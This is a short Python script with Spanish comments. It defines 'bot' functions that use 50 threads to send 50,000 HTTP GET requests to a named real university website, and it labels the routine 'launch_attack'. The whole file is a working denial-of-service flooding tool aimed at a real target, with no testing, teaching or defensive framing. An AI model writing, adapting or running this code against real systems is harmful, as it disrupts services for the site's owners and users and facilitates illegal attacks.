import requests
import threading
def send_requests(bot_name, target_url, num_requests, start_event):
    for i in range(num_requests):
        if start_event.is_set():  # Verificar si se ha activado la señal de inicio
            response = requests.get(target_url)
            if response.status_code == 200:
                print(f"Bot {bot_name}: Respuesta del servidor - Código de estado: {response.status_code}")
            else:
                print(f"Bot {bot_name}: El servidor ha rechazado la solicitud - Código de estado: {response.status_code}")
        else:
            print(f"Bot {bot_name}: Señal de inicio no activada. Esperando instrucciones...")

def launch_attack5(bot_name, start_event):
    # URL del servidor objetivo
    target_url = "https://utecan.edu.mx/"
    num_requests = 50000 ##peticiones
    num_threads = 50    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(bot_name, target_url, num_requests // num_threads, start_event))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
